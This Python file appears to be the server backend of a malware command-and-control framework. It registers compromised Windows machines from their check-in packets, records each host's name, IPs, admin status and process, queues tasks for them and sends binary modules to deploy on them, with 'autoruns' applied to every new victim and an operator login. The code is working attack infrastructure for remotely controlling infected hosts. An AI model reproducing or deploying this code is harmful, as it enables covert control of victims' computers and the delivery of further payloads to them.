import base64
import hashlib
import datetime
import struct
import random

from core import encryption
from core import database
from core import logging
from core.config import Config, get_setting

from flask_login import LoginManager, UserMixin
from flask import request

class TaskingResponse():
    def __init__(self, serialized_data):
        if serialized_data:
            (self.unique_task_id, 
             self.return_code, 
             self.winapi_code) = struct.unpack('III', serialized_data[ : 12])
            self.return_data = serialized_data[12 : ]

class TaskingRequest():
    def __init__(self, task_code, unique_task_id, argument1 = '', argument2 = ''):
        self.task_code = int(task_code)
        self.unique_task_id = int(unique_task_id)
        self.argument1 = argument1
        self.argument2 = argument2

    def serialize(self):
        if isinstance(self.argument1, str):
            self.argument1 = self.argument1.encode()

        if isinstance(self.argument2, str):
            self.argument2 = self.argument2.encode()

        serialized_data = struct.pack('II', self.task_code, self.unique_task_id)
        serialized_data += struct.pack('I', len(self.argument1)) + self.argument1
        serialized_data += struct.pack('I', len(self.argument2)) + self.argument2

        return serialized_data

def parse_hello_packet(instance_id, data):

    logging.success('Recieved Hello packet from {0}'.format(instance_id))

    (
        guid, 
        hostname,
        internal_ips,
        architecture,
        os_version,
        is_admin,
        tb_version,
        cb_period,
        process_id
    ) = data.decode().split('|') # Split the system info into individual variables

    os_version =  get_os_name_from_version(os_version)

    database.cursor.execute('''
    SELECT id, cbperiod FROM targets WHERE `machineguid`=%s AND `hostname`=%s
    ''', (guid, hostname))

    if database.cursor.rowcount == 0:
        # Add a new target!
        logging.success('Adding a new target: {0} {1}'.format(guid, hostname))

        database.cursor.execute('''
        INSERT INTO targets VALUES 
        (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
        ''', (
            None, 
            instance_id, cb_period,
            datetime.datetime.now().isoformat(),
            guid, hostname, is_admin,tb_version,
            internal_ips, os_version, architecture, process_id
        ))

        apply_autoruns(database.connection.insert_id())
    
    else:
        # get it's original period so we can send it
        (target_id, real_cb_period) = database.cursor.fetchone()

        logging.success('Recieved a new hello packet from a known target: {0} {1}'.format(hostname, instance_id))

        database.cursor.execute('''
        UPDATE targets SET 
        `instance` = %s, `tbversion` = %s, `ipaddress` = %s,
        `osversion` = %s, `architecture` = %s, `isadmin` = %s,
        `lastupdate` = %s, `processid` = %s
        WHERE `machineguid`=%s AND `hostname`=%s
        ''', (
            instance_id, tb_version, internal_ips,
            os_version, architecture, is_admin,
            datetime.datetime.now().isoformat(), process_id,
            guid, hostname
        ))

        apply_autoruns(target_id)

        if int(real_cb_period) != int(cb_period):
            logging.success("Queuing a task to set {0}'s callback period back to {1}".format(instance_id, real_cb_period))
            add_task(target_id, get_taskcode_by_name('Set Period'), real_cb_period, '')

def add_to_radar(instance_id, protocol, address):
    database.cursor.execute('''
    SELECT id from targets where `instance`=%s 
    ''', (instance_id))

    if database.cursor.rowcount == 1:
        target_id = database.cursor.fetchone()[0]
        # add heartbeat to radar
        database.cursor.execute('''
        INSERT INTO radar VALUES
        (%s, %s, %s, %s, %s)
        ''', (None, protocol, address, datetime.datetime.now().isoformat(), target_id))

def check_for_tasking(instance_id):
    logging.success('Recieved heartbeat from {0}'.format(instance_id))

    database.cursor.execute('''
    SELECT id from targets where `instance`=%s 
    ''', (instance_id))

    if database.cursor.rowcount == 0:
        logging.error('This is an unknown target! Sending Hello request to {0}'.format(instance_id))
        hello_request = TaskingRequest(0, 0)
        return hello_request.serialize()

    target_id = database.cursor.fetchone()[0]
    current_time = datetime.datetime.now().isoformat()

    # update the last seen time
    database.cursor.execute('''
    UPDATE targets SET lastupdate=%s WHERE id=%s 
    ''', (current_time, target_id))

    # query for waiting tasks
    database.cursor.execute('''
    SELECT * FROM tasking WHERE `target`=%s AND status=%s ORDER BY `opentime` ASC
    ''', (target_id, 'pending'))

    if database.cursor.rowcount == 0:
        return b'' # No tasking

    row = database.cursor.fetchone()
    task_id = row[0]
    task_code = row[2]
    unique_id = row[1]
    argument1 = row[4]
    argument2 = row[5]

    task_request = TaskingRequest(task_code, unique_id, argument1, argument2)

    if task_code == get_module_task_code():
        database.cursor.execute('''
        SELECT data FROM modules WHERE `id`=%s
        ''', (argument1))

        if database.cursor.rowcount == 0:
            logging.error("Failed to locate module {} for task {}".format(argument1, task_id))
            return b''

        task_request.argument1 = base64.b64decode(database.cursor.fetchone()[0].encode())
        logging.success('Deploy module task. Swapping arg1 for module data ({})'.format(len(task_request.argument1)))

    database.cursor.execute('''
    UPDATE tasking SET 
        status = %s, sendtime = %s
    WHERE 
        id = %s
    ''', ('sent', datetime.datetime.now().isoformat(), task_id))

    logging.success("Serving task {0} to instance {1}".format(unique_id, instance_id))

    return task_request.serialize()

def parse_task_response(instance_id, response):

    logging.success('Instance {0} returned results for task {1}'.format(instance_id, response.unique_task_id))

    database.cursor.execute('''
    SELECT id, taskcode, argument1, argument2 FROM tasking 
    WHERE `unique`=%s AND `status`=%s
    ''', (response.unique_task_id, 'sent'))

    if database.cursor.rowcount == 0:
        logging.error("We recieved results for a task that isn't pending!")
        return b''

    (task_id, task_code, arg1, arg2) = database.cursor.fetchone()

    database.cursor.execute('''
    UPDATE tasking SET 
        status = %s, closetime = %s, return_code = %s,
        return_data = %s, winapi_code = %s
    WHERE 
        `id` = %s AND `unique` = %s
    ''', (
        'completed', datetime.datetime.now().isoformat(), 
        response.return_code, response.return_data,
        response.winapi_code, task_id, response.unique_task_id
    ))

    if task_code == get_taskcode_by_name('Set Period'):
        # Update the target information to reflect the change
        logging.success("Instance {0} changed it's callback period to {1}".format(instance_id, arg1))
        database.cursor.execute('''
        UPDATE targets SET cbperiod=%s
        WHERE instance=%s
        ''', (arg1, instance_id))


def handle_callback(data, protocol = 'UNK', address = 'Unknown'):
    return_data = ''
    
    instance_id = data[ : Config.instance_id_length]

    try: # Check to see if the data even looks right
        instance_id = instance_id.decode()
        if not instance_id.isalnum():
            raise Exception('Instance ID is not alphanumeric!')
    except:
        logging.error('Failed to parse callback. Check decryption keys!')
        return b''

    if len(data) == Config.instance_id_length:
        add_to_radar(instance_id, protocol, address)
        return_data = check_for_tasking(instance_id)
    else:
        data = data[Config.instance_id_length : ]
        tasking_response = TaskingResponse(data)

        if tasking_response.unique_task_id == 0:
            parse_hello_packet(instance_id, tasking_response.return_data)
            return b''

        parse_task_response(instance_id, tasking_response)

    if isinstance(return_data, str):
        return_data = return_data.encode()

    if return_data is None:
        return b''
   
    return return_data

# Modules
def get_modules():
    # Skip the raw data for speed in jinja preprocessor
    database.cursor.execute('SELECT id, dateadded, name, size FROM modules' )
    modules = database.cursor.fetchall()
    return modules

def delete_module(id):
    try:  
        database.cursor.execute('DELETE FROM modules WHERE `id`=%s', (int(id)))
        return True
    except:
        return False
    
def add_module(name, file_data):
    current_time = datetime.datetime.utcnow().isoformat()
    file_size = len(file_data)
    file_data = base64.b64encode(file_data).decode()
    
    database.cursor.execute('''
    INSERT INTO `modules` (`dateadded`, `name`, `data`, `size`) VALUES
    (%s, %s, %s, %s)
    ''', (current_time, name, file_data, file_size))

    return True

# Tasks
def get_tasks(target_id):
   database.cursor.execute('''
    SELECT * FROM tasking WHERE target=%s ORDER BY `opentime` DESC
    ''', (target_id))
   return database.cursor.fetchall()

def get_tasks_by_status(target_id, status = 'completed'):
   database.cursor.execute('''
        SELECT * FROM tasking WHERE
        target=%s AND status=%s
    ''', (target_id, status))
   return database.cursor.fetchall()

def add_task(target_id, task_code, arg1 = '', arg2 = ''):
    unique_task_id = random.randint(1, 0xFFFFFFF)
    current_time = datetime.datetime.now().isoformat()

    logging.success("Added '{0}' task [{1}] for target {2} at {3}".format(
        get_name_from_task_code(task_code), unique_task_id, get_hostname_for_target(target_id), current_time))

    database.cursor.execute('''
    INSERT INTO tasking VALUES
    (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
    ''', (
        None, unique_task_id, task_code,
        target_id, arg1, arg2,
        'pending', '', 0, 0,
        current_time, '', '')
    )

    return True

def delete_task(task_id):
    try:  
        database.cursor.execute('DELETE FROM tasking WHERE `id`=%s', (int(task_id)))
        return True
    except:
        return False    

# Targets
def get_targets():
    database.cursor.execute('SELECT * FROM targets ORDER BY `lastupdate` DESC')
    return database.cursor.fetchall()

def get_hostname_for_target(target_id):
    database.cursor.execute('SELECT hostname FROM targets WHERE `id`=%s', (target_id))
    if database.cursor.rowcount:
        return database.cursor.fetchone()[0]
    else:
        return ''

def get_callback_history(target_id):
    database.cursor.execute('''
    SELECT * FROM radar  WHERE
    target = %s
    ORDER BY `time` DESC
    ''', (target_id))
    return database.cursor.fetchall()

def delete_target(target_id):
    try:  
        database.cursor.execute('DELETE FROM targets WHERE `id`=%s', (int(target_id)))
        return True
    except:
        return False

def get_target_by_task_id(task_id):
    database.cursor.execute('SELECT target FROM tasking WHERE `id`=%s', (task_id))
    if database.cursor.rowcount:
        return int(database.cursor.fetchone()[0])
    else:
        return 0

# Task Codes
def get_taskcodes():
    database.cursor.execute('SELECT * FROM taskcodes')
    return database.cursor.fetchall()

def get_taskcode_by_name(name):
    database.cursor.execute('SELECT code FROM taskcodes where name=%s', (name))
    if database.cursor.rowcount:
        return database.cursor.fetchone()[0]
    else:
        return ''

def get_name_from_taskcode(code):
    database.cursor.execute('SELECT name FROM taskcodes where code=%s', (code))
    if database.cursor.rowcount:
        return database.cursor.fetchone()[0]
    else:
        return ''

# Autoruns
def get_autoruns():
    database.cursor.execute('SELECT * FROM autorun')
    return database.cursor.fetchall()

def add_autorun(task_code, arg1 = '', arg2 = ''):
    logging.success("Added '{0}' task autorun".format(get_name_from_task_code(task_code)))

    database.cursor.execute('''
    INSERT INTO autorun VALUES (%s, %s, %s, %s)
    ''', (None, task_code, arg1, arg2))

    return True

def delete_autorun(autorun_id):
    try:  
        database.cursor.execute('DELETE FROM autorun WHERE `id`=%s', (int(autorun_id)))
        return True
    except:
        return False

def apply_autoruns(target_id):
    logging.success('Applying autoruns to {}'.format(get_hostname_for_target(target_id)))

    for autorun in get_autoruns():
        add_task(target_id, *autorun[1:])
        
    return True

# Static Conversions
def get_os_name_from_version(number):
    database.cursor.execute('SELECT name FROM operatingsystems WHERE version=%s', (number))
    if database.cursor.rowcount:
        return database.cursor.fetchone()[0]
    else:
        return ''

def get_message_from_return_code(code):
    database.cursor.execute('SELECT message FROM returncodes WHERE code=%s', (code))
    if database.cursor.rowcount:
        return database.cursor.fetchone()[0]
    else:
        return ''

def get_module_task_code():
    database.cursor.execute('''
    SELECT code FROM taskcodes WHERE `arg1default`=%s
    ''', ('module'))

    if database.cursor.rowcount != 0:
        return int(database.cursor.fetchone()[0])

    return 0

def get_name_from_task_code(code):
    database.cursor.execute('''
    SELECT name FROM taskcodes WHERE `code`=%s
    ''', (code))

    if database.cursor.rowcount != 0:
        return database.cursor.fetchone()[0]
    else:
        return ''

# Authentication
login_manager = None

class User(UserMixin):
    def __init__(self, id, username = 'Unknown', password = ""):
        self.id = id
        self.username = username
        self.password = password

    def check_password(self, given):
        if hashlib.sha1(given.encode()).hexdigest() == self.password:
            return True
        else:
            return False

    def __repr__(self):
        return "<User: %s>" % (self.username)

def get_user(username, password):
    password = hashlib.sha1(password.encode()).hexdigest()

    database.cursor.execute("SELECT `id`, `username`, `password` FROM `users` WHERE `username`=%s AND `password`=%s", (username, password))

    if database.cursor.rowcount == 1:
        row = database.cursor.fetchone()
        if row:
            return User(row[0], username = row[1], password = row[2])

    return None

def get_user_by_id(id):
    database.cursor.execute("SELECT `id`, `username` FROM `users` WHERE `id`=%s", (id))

    if database.cursor.rowcount == 1:
        row = database.cursor.fetchone()
        if row:
            return User(row[0], username = row[1])

    return None

def load_user(userid):
    user = User(userid)
    return user if user else User(0)
